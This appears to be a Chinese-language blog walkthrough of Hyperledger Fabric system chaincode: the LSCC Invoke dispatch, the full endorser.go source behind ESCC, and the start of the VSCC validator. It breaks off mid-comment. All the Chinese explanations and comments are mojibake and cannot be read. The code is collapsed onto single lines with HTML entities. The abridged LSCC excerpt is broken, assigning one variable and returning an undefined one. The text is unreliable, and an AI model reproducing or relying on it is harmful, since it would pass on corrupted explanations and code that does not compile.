é€šè¿‡ç¬¬äºŒä¸ªå‚æ•°è·å–é…ç½® depSpec := args[2] cds := \u0026amp;pb.ChaincodeDeploymentSpec{} // å¯é€‰å‚æ•°ï¼š // ç¬¬å››ä¸ªå‚æ•°æ˜¯ å·²ç¼–ç»„çš„ SignaturePolicyEnvelope ä»£è¡¨äº†èƒŒä¹¦æ”¿ç­– // ç¬¬äº”ä¸ªå‚æ•°æ˜¯ esccå // ç¬¬å…­ä¸ªå‚æ•°æ˜¯ vsccå // ç¬¬ä¸ƒä¸ªå‚æ•°æ˜¯ ä¸€ä¸ªå·²ç¼–ç»„çš„ CollectionConfigPackage ç±» // ç¬¬å››ä¸ªå‚æ•°ï¼š var EP []byte if len(args) \u0026gt; 3 \u0026amp;\u0026amp; len(args[3]) \u0026gt; 0 { EP = args[3] // EPä¸ºä¸€ä¸ªèƒŒä¹¦æ”¿ç­– } else { mspIDs := lscc.GetMSPIDs(channel) p := policydsl.SignedByAnyMember(mspIDs) // æ ¹æ®é€šé“çš„mspIDè·å–èƒŒä¹¦æ”¿ç­–ï¼Ÿ EP, err = protoutil.Marshal(p) // å°†ç»“æœè¿›è¡Œç¼–ç»„ } // ç¬¬äº”ä¸ªå‚æ•°ï¼š var escc []byte if len(args) \u0026gt; 4 \u0026amp;\u0026amp; len(args[4]) \u0026gt; 0 { escc = args[4] } else { escc = []byte(\u0026#34;escc\u0026#34;) // é»˜è®¤ä¸ºescc } // ç¬¬å…­ä¸ªå‚æ•°ï¼š var vscc []byte if len(args) \u0026gt; 5 \u0026amp;\u0026amp; len(args[5]) \u0026gt; 0 { vscc = args[5] } else { vscc = []byte(\u0026#34;vscc\u0026#34;) // é»˜è®¤ä¸ºvscc } // å¦‚æœæœ‰ç¬¬ä¸ƒä¸ªå‚æ•°ï¼š var collectionsConfig []byte if ac.Capabilities().PrivateChannelData() \u0026amp;\u0026amp; len(args) \u0026gt; 6 { collectionsConfig = args[6] } // å°†æ‰€æœ‰çš„å‚æ•°ä¼ å…¥executeDeployOrUpgradeæ–¹æ³•ä¸­æ‰§è¡Œ cd, err := lscc.executeDeployOrUpgrade(stub, channel, cds, EP, escc, vscc, collectionsConfig, function) return shim.Success(cdbytes) case CCEXISTS, CHAINCODEEXISTS, GETDEPSPEC, GETDEPLOYMENTSPEC, GETCCDATA, GETCHAINCODEDATA: // å˜é‡ä¸ªæ•°å¿…é¡»ä¸º3 channel := string(args[1]) ccname := string(args[2]) cdbytes, err := lscc.getCCInstance(stub, ccname) // è·å–å®ä¾‹ switch function { case CCEXISTS, CHAINCODEEXISTS: cd, err := lscc.getChaincodeData(ccname, cdbytes) // è·å–é“¾ç æ•°æ® case GETCCDATA, GETCHAINCODEDATA: return shim.Success(cdbytes) case GETDEPSPEC, GETDEPLOYMENTSPEC: _, depspecbytes, err := lscc.getCCCode(ccname, cdbytes) return shim.Success(depspecbytes) default: panic(\u0026#34;unreachable\u0026#34;) } case GETCHAINCODES, GETCHAINCODESALIAS: // å˜é‡ä¸ªæ•°å¿…é¡»ä¸º1 return lscc.getChaincodes(stub) // è°ƒç”¨å¯¹åº”æ–¹æ³• case GETINSTALLEDCHAINCODES, GETINSTALLEDCHAINCODESALIAS: // å˜é‡ä¸ªæ•°å¿…é¡»ä¸º1 return lscc.getInstalledChaincodes() // è°ƒç”¨å¯¹åº”æ–¹æ³• case GETCOLLECTIONSCONFIG, GETCOLLECTIONSCONFIGALIAS: // å˜é‡ä¸ªæ•°å¿…é¡»ä¸º2 chaincodeName := string(args[1]) return lscc.getChaincodeCollectionData(stub, chaincodeName) // è°ƒç”¨å¯¹åº”æ–¹æ³• } return shim.Error(InvalidFunctionErr(function).Error()) } Installæ–¹æ³•ï¼š\nç”¨äºå­˜å‚¨chaincodeç¨‹åºåˆ°peerçš„æ–‡ä»¶ç³»ç»Ÿï¼Œéœ€è¦ä¸€ä¸ªå‚æ•°ï¼ŒåŠchancode deployment specçš„åºåˆ—åŒ–protobuf bytesã€‚\nDeployæ–¹æ³•ï¼š\nç”¨äºåœ¨ç»™å®šçš„é€šé“ä¸Šå®ä¾‹åŒ–åˆçº¦ï¼Œå¯ä»¥æ¥å—äº”ä¸ªå‚æ•°ï¼Œå‰ä¸¤ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ï¼šé€šé“åç§°ä¸chaincode deployment specã€‚å¦å¤–ä¸‰ä¸ªå‚æ•°ä¸ºï¼šå€æ•°ç­–ç•¥ã€èƒŒä¹¦ç³»ç»Ÿåˆçº¦çš„åå­—å’ŒéªŒè¯ç³»ç»Ÿåˆçº¦çš„åå­—ã€‚\nUpgradeæ–¹æ³•ï¼š\nç”¨äºå‡çº§åˆçº¦\nGetæ–¹æ³•ï¼š\nå‰©ä¸‹çš„getæ–¹æ³•éƒ½ç”¨äºè·å–ç›¸åº”çš„åˆçº¦æ•°æ®\nèƒŒä¹¦ç³»ç»Ÿé“¾ç  (Endorser System Chaincode, ESCC) åœ¨èƒŒä¹¦èŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œå¯¹äº¤æ˜“ç»“æŸè¿›è¡Œç»“æ„è½¬æ¢å’Œç­¾åèƒŒä¹¦ã€‚\n/core/endorser/endorser.go\npackage endorser import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/golang/protobuf/proto\u0026#34; \u0026#34;github.com/hyperledger/fabric-chaincode-go/shim\u0026#34; pb \u0026#34;github.com/hyperledger/fabric-protos-go/peer\u0026#34; \u0026#34;github.com/hyperledger/fabric-protos-go/transientstore\u0026#34; \u0026#34;github.com/hyperledger/fabric/common/flogging\u0026#34; \u0026#34;github.com/hyperledger/fabric/common/util\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/chaincode/lifecycle\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/common/ccprovider\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/ledger\u0026#34; \u0026#34;github.com/hyperledger/fabric/internal/pkg/identity\u0026#34; \u0026#34;github.com/hyperledger/fabric/msp\u0026#34; \u0026#34;github.com/hyperledger/fabric/protoutil\u0026#34; \u0026#34;github.com/pkg/errors\u0026#34; \u0026#34;go.uber.org/zap\u0026#34; ) var endorserLogger = flogging.MustGetLogger(\u0026#34;endorser\u0026#34;) // The Jira issue that documents Endorser flow along with its relationship to // the lifecycle chaincode - https://jira.hyperledger.org/browse/FAB-181 //go:generate counterfeiter -o fake/prvt_data_distributor.go --fake-name PrivateDataDistributor . PrivateDataDistributor type PrivateDataDistributor interface { DistributePrivateData(channel string, txID string, privateData *transientstore.TxPvtReadWriteSetWithConfigInfo, blkHt uint64) error } // Support contains functions that the endorser requires to execute its tasks type Support interface { identity.SignerSerializer // GetTxSimulator returns the transaction simulator for the specified ledger // a client may obtain more than one such simulator; they are made unique // by way of the supplied txid GetTxSimulator(ledgername string, txid string) (ledger.TxSimulator, error) // GetHistoryQueryExecutor gives handle to a history query executor for the // specified ledger GetHistoryQueryExecutor(ledgername string) (ledger.HistoryQueryExecutor, error) // GetTransactionByID retrieves a transaction by id GetTransactionByID(chid, txID string) (*pb.ProcessedTransaction, error) // IsSysCC returns true if the name matches a system chaincode\u0026#39;s // system chaincode names are system, chain wide IsSysCC(name string) bool // Execute - execute proposal, return original response of chaincode Execute(txParams *ccprovider.TransactionParams, name string, input *pb.ChaincodeInput) (*pb.Response, *pb.ChaincodeEvent, error) // ExecuteLegacyInit - executes a deployment proposal, return original response of chaincode ExecuteLegacyInit(txParams *ccprovider.TransactionParams, name, version string, spec *pb.ChaincodeInput) (*pb.Response, *pb.ChaincodeEvent, error) // ChaincodeEndorsementInfo returns the information from lifecycle required to endorse the chaincode. ChaincodeEndorsementInfo(channelID, chaincodeID string, txsim ledger.QueryExecutor) (*lifecycle.ChaincodeEndorsementInfo, error) // CheckACL checks the ACL for the resource for the channel using the // SignedProposal from which an id can be extracted for testing against a policy CheckACL(channelID string, signedProp *pb.SignedProposal) error // EndorseWithPlugin endorses the response with a plugin EndorseWithPlugin(pluginName, channnelID string, prpBytes []byte, signedProposal *pb.SignedProposal) (*pb.Endorsement, []byte, error) // GetLedgerHeight returns ledger height for given channelID GetLedgerHeight(channelID string) (uint64, error) // GetDeployedCCInfoProvider returns ledger.DeployedChaincodeInfoProvider GetDeployedCCInfoProvider() ledger.DeployedChaincodeInfoProvider } //go:generate counterfeiter -o fake/channel_fetcher.go --fake-name ChannelFetcher . ChannelFetcher // ChannelFetcher fetches the channel context for a given channel ID. type ChannelFetcher interface { Channel(channelID string) *Channel } type Channel struct { IdentityDeserializer msp.IdentityDeserializer } // Endorser provides the Endorser service ProcessProposal type Endorser struct { ChannelFetcher ChannelFetcher LocalMSP msp.IdentityDeserializer PrivateDataDistributor PrivateDataDistributor Support Support PvtRWSetAssembler PvtRWSetAssembler Metrics *Metrics } // call specified chaincode (system or user) func (e *Endorser) callChaincode(txParams *ccprovider.TransactionParams, input *pb.ChaincodeInput, chaincodeName string) (*pb.Response, *pb.ChaincodeEvent, error) { defer func(start time.Time) { logger := endorserLogger.WithOptions(zap.AddCallerSkip(1)) logger = decorateLogger(logger, txParams) elapsedMillisec := time.Since(start).Milliseconds() logger.Infof(\u0026#34;finished chaincode: %s duration: %dms\u0026#34;, chaincodeName, elapsedMillisec) }(time.Now()) meterLabels := []string{ \u0026#34;channel\u0026#34;, txParams.ChannelID, \u0026#34;chaincode\u0026#34;, chaincodeName, } res, ccevent, err := e.Support.Execute(txParams, chaincodeName, input) if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, err } // per doc anything \u0026lt; 400 can be sent as TX. // fabric errors will always be \u0026gt;= 400 (ie, unambiguous errors ) // \u0026#34;lscc\u0026#34; will respond with status 200 or 500 (ie, unambiguous OK or ERROR) if res.Status \u0026gt;= shim.ERRORTHRESHOLD { return res, nil, nil } // Unless this is the weirdo LSCC case, just return if chaincodeName != \u0026#34;lscc\u0026#34; || len(input.Args) \u0026lt; 3 || (string(input.Args[0]) != \u0026#34;deploy\u0026#34; \u0026amp;\u0026amp; string(input.Args[0]) != \u0026#34;upgrade\u0026#34;) { return res, ccevent, nil } // ----- BEGIN - SECTION THAT MAY NEED TO BE DONE IN LSCC ------ // if this a call to deploy a chaincode, We need a mechanism // to pass TxSimulator into LSCC. Till that is worked out this // special code does the actual deploy, upgrade here so as to collect // all state under one TxSimulator // // NOTE that if there\u0026#39;s an error all simulation, including the chaincode // table changes in lscc will be thrown away cds, err := protoutil.UnmarshalChaincodeDeploymentSpec(input.Args[2]) if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, err } // this should not be a system chaincode if e.Support.IsSysCC(cds.ChaincodeSpec.ChaincodeId.Name) { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, errors.Errorf(\u0026#34;attempting to deploy a system chaincode %s/%s\u0026#34;, cds.ChaincodeSpec.ChaincodeId.Name, txParams.ChannelID) } if len(cds.CodePackage) != 0 { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, errors.Errorf(\u0026#34;lscc upgrade/deploy should not include a code packages\u0026#34;) } _, _, err = e.Support.ExecuteLegacyInit(txParams, cds.ChaincodeSpec.ChaincodeId.Name, cds.ChaincodeSpec.ChaincodeId.Version, cds.ChaincodeSpec.Input) if err != nil { // increment the failure to indicate instantion/upgrade failures meterLabels = []string{ \u0026#34;channel\u0026#34;, txParams.ChannelID, \u0026#34;chaincode\u0026#34;, cds.ChaincodeSpec.ChaincodeId.Name, } e.Metrics.InitFailed.With(meterLabels...).Add(1) return nil, nil, err } return res, ccevent, err } // SimulateProposal simulates the proposal by calling the chaincode func (e *Endorser) SimulateProposal(txParams *ccprovider.TransactionParams, chaincodeName string, chaincodeInput *pb.ChaincodeInput) (*pb.Response, []byte, *pb.ChaincodeEvent, error) { logger := decorateLogger(endorserLogger, txParams) meterLabels := []string{ \u0026#34;channel\u0026#34;, txParams.ChannelID, \u0026#34;chaincode\u0026#34;, chaincodeName, } // ---3. execute the proposal and get simulation results res, ccevent, err := e.callChaincode(txParams, chaincodeInput, chaincodeName) if err != nil { logger.Errorf(\u0026#34;failed to invoke chaincode %s, error: %+v\u0026#34;, chaincodeName, err) return nil, nil, nil, err } if txParams.TXSimulator == nil { return res, nil, ccevent, nil } // Note, this is a little goofy, as if there is private data, Done() gets called // early, so this is invoked multiple times, but that is how the code worked before // this change, so, should be safe. Long term, let\u0026#39;s move the Done up to the create. defer txParams.TXSimulator.Done() simResult, err := txParams.TXSimulator.GetTxSimulationResults() if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, err } if simResult.PvtSimulationResults != nil { if chaincodeName == \u0026#34;lscc\u0026#34; { // TODO: remove once we can store collection configuration outside of LSCC e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, errors.New(\u0026#34;Private data is forbidden to be used in instantiate\u0026#34;) } pvtDataWithConfig, err := AssemblePvtRWSet(txParams.ChannelID, simResult.PvtSimulationResults, txParams.TXSimulator, e.Support.GetDeployedCCInfoProvider()) // To read collection config need to read collection updates before // releasing the lock, hence txParams.TXSimulator.Done() moved down here txParams.TXSimulator.Done() if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, errors.WithMessage(err, \u0026#34;failed to obtain collections config\u0026#34;) } endorsedAt, err := e.Support.GetLedgerHeight(txParams.ChannelID) if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, errors.WithMessage(err, fmt.Sprintf(\u0026#34;failed to obtain ledger height for channel \u0026#39;%s\u0026#39;\u0026#34;, txParams.ChannelID)) } // Add ledger height at which transaction was endorsed, // `endorsedAt` is obtained from the block storage and at times this could be \u0026#39;endorsement Height + 1\u0026#39;. // However, since we use this height only to select the configuration (3rd parameter in distributePrivateData) and // manage transient store purge for orphaned private writesets (4th parameter in distributePrivateData), this works for now. // Ideally, ledger should add support in the simulator as a first class function `GetHeight()`. pvtDataWithConfig.EndorsedAt = endorsedAt if err := e.PrivateDataDistributor.DistributePrivateData(txParams.ChannelID, txParams.TxID, pvtDataWithConfig, endorsedAt); err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, err } } pubSimResBytes, err := simResult.GetPubSimulationBytes() if err != nil { e.Metrics.SimulationFailure.With(meterLabels...).Add(1) return nil, nil, nil, err } return res, pubSimResBytes, ccevent, nil } // preProcess checks the tx proposal headers, uniqueness and ACL func (e *Endorser) preProcess(up *UnpackedProposal, channel *Channel) error { // at first, we check whether the message is valid err := up.Validate(channel.IdentityDeserializer) if err != nil { e.Metrics.ProposalValidationFailed.Add(1) return errors.WithMessage(err, \u0026#34;error validating proposal\u0026#34;) } if up.ChannelHeader.ChannelId == \u0026#34;\u0026#34; { // chainless proposals do not/cannot affect ledger and cannot be submitted as transactions // ignore uniqueness checks; also, chainless proposals are not validated using the policies // of the chain since by definition there is no chain; they are validated against the local // MSP of the peer instead by the call to ValidateUnpackProposal above return nil } // labels that provide context for failure metrics meterLabels := []string{ \u0026#34;channel\u0026#34;, up.ChannelHeader.ChannelId, \u0026#34;chaincode\u0026#34;, up.ChaincodeName, } // Here we handle uniqueness check and ACLs for proposals targeting a chain // Notice that ValidateProposalMessage has already verified that TxID is computed properly if _, err = e.Support.GetTransactionByID(up.ChannelHeader.ChannelId, up.ChannelHeader.TxId); err == nil { // increment failure due to duplicate transactions. Useful for catching replay attacks in // addition to benign retries e.Metrics.DuplicateTxsFailure.With(meterLabels...).Add(1) return errors.Errorf(\u0026#34;duplicate transaction found [%s]. Creator [%x]\u0026#34;, up.ChannelHeader.TxId, up.SignatureHeader.Creator) } // check ACL only for application chaincodes; ACLs // for system chaincodes are checked elsewhere if !e.Support.IsSysCC(up.ChaincodeName) { // check that the proposal complies with the Channel\u0026#39;s writers if err = e.Support.CheckACL(up.ChannelHeader.ChannelId, up.SignedProposal); err != nil { e.Metrics.ProposalACLCheckFailed.With(meterLabels...).Add(1) return err } } return nil } // ProcessProposal process the Proposal func (e *Endorser) ProcessProposal(ctx context.Context, signedProp *pb.SignedProposal) (*pb.ProposalResponse, error) { // start time for computing elapsed time metric for successfully endorsed proposals startTime := time.Now() e.Metrics.ProposalsReceived.Add(1) addr := util.ExtractRemoteAddress(ctx) endorserLogger.Debug(\u0026#34;request from\u0026#34;, addr) // variables to capture proposal duration metric success := false up, err := UnpackProposal(signedProp) if err != nil { e.Metrics.ProposalValidationFailed.Add(1) return \u0026amp;pb.ProposalResponse{Response: \u0026amp;pb.Response{Status: 500, Message: err.Error()}}, err } var channel *Channel if up.ChannelID() != \u0026#34;\u0026#34; { channel = e.ChannelFetcher.Channel(up.ChannelID()) if channel == nil { return \u0026amp;pb.ProposalResponse{Response: \u0026amp;pb.Response{Status: 500, Message: fmt.Sprintf(\u0026#34;channel \u0026#39;%s\u0026#39; not found\u0026#34;, up.ChannelHeader.ChannelId)}}, nil } } else { channel = \u0026amp;Channel{ IdentityDeserializer: e.LocalMSP, } } // 0 -- check and validate err = e.preProcess(up, channel) if err != nil { return \u0026amp;pb.ProposalResponse{Response: \u0026amp;pb.Response{Status: 500, Message: err.Error()}}, err } defer func() { meterLabels := []string{ \u0026#34;channel\u0026#34;, up.ChannelHeader.ChannelId, \u0026#34;chaincode\u0026#34;, up.ChaincodeName, \u0026#34;success\u0026#34;, strconv.FormatBool(success), } e.Metrics.ProposalDuration.With(meterLabels...).Observe(time.Since(startTime).Seconds()) }() pResp, err := e.ProcessProposalSuccessfullyOrError(up) if err != nil { return \u0026amp;pb.ProposalResponse{Response: \u0026amp;pb.Response{Status: 500, Message: err.Error()}}, nil } if pResp.Endorsement != nil || up.ChannelHeader.ChannelId == \u0026#34;\u0026#34; { // We mark the tx as successfull only if it was successfully endorsed, or // if it was a system chaincode on a channel-less channel and therefore // cannot be endorsed. success = true // total failed proposals = ProposalsReceived-SuccessfulProposals e.Metrics.SuccessfulProposals.Add(1) } return pResp, nil } func (e *Endorser) ProcessProposalSuccessfullyOrError(up *UnpackedProposal) (*pb.ProposalResponse, error) { txParams := \u0026amp;ccprovider.TransactionParams{ ChannelID: up.ChannelHeader.ChannelId, TxID: up.ChannelHeader.TxId, SignedProp: up.SignedProposal, Proposal: up.Proposal, } logger := decorateLogger(endorserLogger, txParams) if acquireTxSimulator(up.ChannelHeader.ChannelId, up.ChaincodeName) { txSim, err := e.Support.GetTxSimulator(up.ChannelID(), up.TxID()) if err != nil { return nil, err } // txsim acquires a shared lock on the stateDB. As this would impact the block commits (i.e., commit // of valid write-sets to the stateDB), we must release the lock as early as possible. // Hence, this txsim object is closed in simulateProposal() as soon as the tx is simulated and // rwset is collected before gossip dissemination if required for privateData. For safety, we // add the following defer statement and is useful when an error occur. Note that calling // txsim.Done() more than once does not cause any issue. If the txsim is already // released, the following txsim.Done() simply returns. defer txSim.Done() hqe, err := e.Support.GetHistoryQueryExecutor(up.ChannelID()) if err != nil { return nil, err } txParams.TXSimulator = txSim txParams.HistoryQueryExecutor = hqe } cdLedger, err := e.Support.ChaincodeEndorsementInfo(up.ChannelID(), up.ChaincodeName, txParams.TXSimulator) if err != nil { return nil, errors.WithMessagef(err, \u0026#34;make sure the chaincode %s has been successfully defined on channel %s and try again\u0026#34;, up.ChaincodeName, up.ChannelID()) } // 1 -- simulate res, simulationResult, ccevent, err := e.SimulateProposal(txParams, up.ChaincodeName, up.Input) if err != nil { return nil, errors.WithMessage(err, \u0026#34;error in simulation\u0026#34;) } cceventBytes, err := CreateCCEventBytes(ccevent) if err != nil { return nil, errors.Wrap(err, \u0026#34;failed to marshal chaincode event\u0026#34;) } prpBytes, err := protoutil.GetBytesProposalResponsePayload(up.ProposalHash, res, simulationResult, cceventBytes, \u0026amp;pb.ChaincodeID{ Name: up.ChaincodeName, Version: cdLedger.Version, }) if err != nil { logger.Warning(\u0026#34;Failed marshaling the proposal response payload to bytes\u0026#34;, err) return nil, errors.WithMessage(err, \u0026#34;failed to create the proposal response\u0026#34;) } // if error, capture endorsement failure metric meterLabels := []string{ \u0026#34;channel\u0026#34;, up.ChannelID(), \u0026#34;chaincode\u0026#34;, up.ChaincodeName, } switch { case res.Status \u0026gt;= shim.ERROR: return \u0026amp;pb.ProposalResponse{ Response: res, Payload: prpBytes, }, nil case up.ChannelID() == \u0026#34;\u0026#34;: // Chaincode invocations without a channel ID is a broken concept // that should be removed in the future. For now, return unendorsed // success. return \u0026amp;pb.ProposalResponse{ Response: res, }, nil case res.Status \u0026gt;= shim.ERRORTHRESHOLD: meterLabels = append(meterLabels, \u0026#34;chaincodeerror\u0026#34;, strconv.FormatBool(true)) e.Metrics.EndorsementsFailed.With(meterLabels...).Add(1) logger.Debugf(\u0026#34;chaincode error %d\u0026#34;, res.Status) return \u0026amp;pb.ProposalResponse{ Response: res, }, nil } escc := cdLedger.EndorsementPlugin logger.Debugf(\u0026#34;escc for chaincode %s is %s\u0026#34;, up.ChaincodeName, escc) // Note, mPrpBytes is the same as prpBytes by default endorsement plugin, but others could change it. endorsement, mPrpBytes, err := e.Support.EndorseWithPlugin(escc, up.ChannelID(), prpBytes, up.SignedProposal) if err != nil { meterLabels = append(meterLabels, \u0026#34;chaincodeerror\u0026#34;, strconv.FormatBool(false)) e.Metrics.EndorsementsFailed.With(meterLabels...).Add(1) return nil, errors.WithMessage(err, \u0026#34;endorsing with plugin failed\u0026#34;) } return \u0026amp;pb.ProposalResponse{ Version: 1, Endorsement: endorsement, Payload: mPrpBytes, Response: res, }, nil } // determine whether or not a transaction simulator should be // obtained for a proposal. func acquireTxSimulator(chainID string, chaincodeName string) bool { if chainID == \u0026#34;\u0026#34; { return false } // Â¯\\_(ãƒ„)_/Â¯ locking. // Don\u0026#39;t get a simulator for the query and config system chaincode. // These don\u0026#39;t need the simulator and its read lock results in deadlocks. switch chaincodeName { case \u0026#34;qscc\u0026#34;, \u0026#34;cscc\u0026#34;: return false default: return true } } // shorttxid replicates the chaincode package function to shorten txids. // ~~TODO utilize a common shorttxid utility across packages.~~ // TODO use a formal type for transaction ID and make it a stringer func shorttxid(txid string) string { if len(txid) \u0026lt; 8 { return txid } return txid[0:8] } func CreateCCEventBytes(ccevent *pb.ChaincodeEvent) ([]byte, error) { if ccevent == nil { return nil, nil } return proto.Marshal(ccevent) } func decorateLogger(logger *flogging.FabricLogger, txParams *ccprovider.TransactionParams) *flogging.FabricLogger { return logger.With(\u0026#34;channel\u0026#34;, txParams.ChannelID, \u0026#34;txID\u0026#34;, shorttxid(txParams.TxID)) } éªŒè¯ç³»ç»Ÿé“¾ç  (Validator System Chaincode, VSCC) /core/committer/txvalidator/v14/vscc_validator.go\nè¢«è®°è´¦èŠ‚ç‚¹(validator)è°ƒç”¨ï¼Œæ ¹æ®åˆçº¦çš„èƒŒä¹¦æ”¿ç­–éªŒè¯äº¤æ˜“çš„æœ‰æ•ˆæ€§å’ŒèƒŒä¹¦çš„æ­£ç¡®æ€§ã€‚\npackage txvalidator import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/golang/protobuf/proto\u0026#34; \u0026#34;github.com/hyperledger/fabric-protos-go/common\u0026#34; \u0026#34;github.com/hyperledger/fabric-protos-go/peer\u0026#34; commonerrors \u0026#34;github.com/hyperledger/fabric/common/errors\u0026#34; \u0026#34;github.com/hyperledger/fabric/common/policydsl\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/common/ccprovider\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/common/sysccprovider\u0026#34; validation \u0026#34;github.com/hyperledger/fabric/core/handlers/validation/api\u0026#34; \u0026#34;github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/rwsetutil\u0026#34; \u0026#34;github.com/hyperledger/fabric/protoutil\u0026#34; \u0026#34;github.com/pkg/errors\u0026#34; ) // VsccValidatorImpl is the implementation used to call // the vscc chaincode and validate block transactions type VsccValidatorImpl struct { channelID string cr ChannelResources pluginValidator *PluginValidator } // ç”¨äºè°ƒç”¨vsccé“¾ç å¹¶éªŒè¯åŒºå—äº‹åŠ¡ // newVSCCValidator creates new vscc validator func newVSCCValidator(channelID string, cr ChannelResources, pluginValidator *PluginValidator) *VsccValidatorImpl { return \u0026amp;VsccValidatorImpl{ channelID: channelID, cr: cr, pluginValidator: pluginValidator, } } func getChaincodeHeaderExtension(hdr *common.Header) (*peer.ChaincodeHeaderExtension, error) { chdr, err := protoutil.UnmarshalChannelHeader(hdr.ChannelHeader) if err != nil { return nil, err } chaincodeHdrExt := \u0026amp;peer.ChaincodeHeaderExtension{} err = proto.Unmarshal(chdr.Extension, chaincodeHdrExt) return chaincodeHdrExt, errors.Wrap(err, \u0026#34;error unmarshaling ChaincodeHeaderExtension\u0026#34;) } // VSCCValidateTx executes vscc validation for transaction func (v *VsccValidatorImpl) VSCCValidateTx(seq int, payload *common.Payload, envBytes []byte, block *common.Block) (error, peer.TxValidationCode) { chainID := v.channelID logger.Debugf(\u0026#34;[%s] VSCCValidateTx starts for bytes %p\u0026#34;, chainID, envBytes) // get header extensions so we have the chaincode ID hdrExt, err := getChaincodeHeaderExtension(payload.Header) if err != nil { return err, peer.TxValidationCode_BAD_HEADER_EXTENSION } // get channel header chdr, err := protoutil.UnmarshalChannelHeader(payload.Header.ChannelHeader) if err != nil { return err, peer.TxValidationCode_BAD_CHANNEL_HEADER } /* obtain the list of namespaces we\u0026#39;re writing stuff to; at first, we establish a few facts about this invocation: 1) which namespaces does it write to? 2) does it write to LSCC\u0026#39;s namespace? 3) does it write to any cc that cannot be invoked? */ writesToLSCC := false writesToNonInvokableSCC := false respPayload, err := protoutil.GetActionFromEnvelope(envBytes) if err != nil { return errors.WithMessage(err, \u0026#34;GetActionFromEnvelope failed\u0026#34;), peer.TxValidationCode_BAD_RESPONSE_PAYLOAD } txRWSet := \u0026amp;rwsetutil.TxRwSet{} if err = txRWSet.FromProtoBytes(respPayload.Results); err != nil { return errors.WithMessage(err, \u0026#34;txRWSet.FromProtoBytes failed\u0026#34;), peer.TxValidationCode_BAD_RWSET } // Verify the header extension and response payload contain the ChaincodeId if hdrExt.ChaincodeId == nil { return errors.New(\u0026#34;nil ChaincodeId in header extension\u0026#34;), peer.TxValidationCode_INVALID_OTHER_REASON } if respPayload.ChaincodeId == nil { return errors.New(\u0026#34;nil ChaincodeId in ChaincodeAction\u0026#34;), peer.TxValidationCode_INVALID_OTHER_REASON } // get name and version of the cc we invoked ccID := hdrExt.ChaincodeId.Name ccVer := respPayload.ChaincodeId.Version // sanity check on ccID if ccID == \u0026#34;\u0026#34; { err = errors.New(\u0026#34;invalid chaincode ID\u0026#34;) logger.Errorf(\u0026#34;%+v\u0026#34;, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } if ccID != respPayload.ChaincodeId.Name { err = errors.Errorf(\u0026#34;inconsistent ccid info (%s/%s)\u0026#34;, ccID, respPayload.ChaincodeId.Name) logger.Errorf(\u0026#34;%+v\u0026#34;, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } // sanity check on ccver if ccVer == \u0026#34;\u0026#34; { err = errors.New(\u0026#34;invalid chaincode version\u0026#34;) logger.Errorf(\u0026#34;%+v\u0026#34;, err) return err, peer.TxValidationCode_INVALID_OTHER_REASON } var wrNamespace []string alwaysEnforceOriginalNamespace := v.cr.Capabilities().V1_2Validation() if alwaysEnforceOriginalNamespace { wrNamespace = append(wrNamespace, ccID) if respPayload.Events != nil { ccEvent := \u0026amp;peer.ChaincodeEvent{} if err = proto.Unmarshal(respPayload.Events, ccEvent); err != nil { return errors.Wrapf(err, \u0026#34;invalid chaincode event\u0026#34;), peer.TxValidationCode_INVALID_OTHER_REASON } if ccEvent.ChaincodeId != ccID { return errors.Errorf(\u0026#34;chaincode event chaincode id does not match chaincode action chaincode id\u0026#34;), peer.TxValidationCode_INVALID_OTHER_REASON } } } namespaces := make(map[string]struct{}) for _, ns := range txRWSet.NsRwSets { // check to make sure there is no duplicate namespace in txRWSet if _, ok := namespaces[ns.NameSpace]; ok { return errors.Errorf(\u0026#34;duplicate namespace \u0026#39;%s\u0026#39; in txRWSet\u0026#34;, ns.NameSpace), peer.TxValidationCode_ILLEGAL_WRITESET } namespaces[ns.NameSpace] = struct{}{} if !v.txWritesToNamespace(ns) { continue } // Check to make sure we did not already populate this chaincode // name to avoid checking the same namespace twice if ns.NameSpace != ccID || !alwaysEnforceOriginalNamespace { wrNamespace = append(wrNamespace, ns.NameSpace) } if !writesToLSCC \u0026amp;\u0026amp; ns.NameSpace == \u0026#34;lscc\u0026#34; { writesToLSCC = true } if !writesToNonInvokableSCC \u0026amp;\u0026amp; IsSysCCAndNotInvokableCC2CC(ns.NameSpace) { writesToNonInvokableSCC = true } if !writesToNonInvokableSCC \u0026amp;\u0026amp; IsSysCCAndNotInvokableExternal(ns.NameSpace) { writesToNonInvokableSCC = true } } // we\u0026#39;ve gathered all the info required to proceed to validation; // validation will behave differently depending on the type of // chaincode (system vs. application) if !IsSysCC(ccID) { // if we\u0026#39;re here, we know this is an invocation of an application chaincode; // first of all, we make sure that: // 1) we don\u0026#39;t write to LSCC - an application chaincode is free to invoke LSCC // for instance to get information about itself or another chaincode; however // these legitimate invocations only ready from LSCC\u0026#39;s namespace; currently // only two functions of LSCC write to its namespace: deploy and upgrade and // neither should be used by an application chaincode if writesToLSCC { return errors.Errorf(\u0026#34;chaincode %s attempted to write to the namespace of LSCC\u0026#34;, ccID), peer.TxValidationCode_ILLEGAL_WRITESET } // 2) we don\u0026#39;t write to the namespace of a chaincode that we cannot invoke - if // the chaincode cannot be invoked in the first place, there\u0026#39;s no legitimate // way in which a transaction has a write set that writes to it; 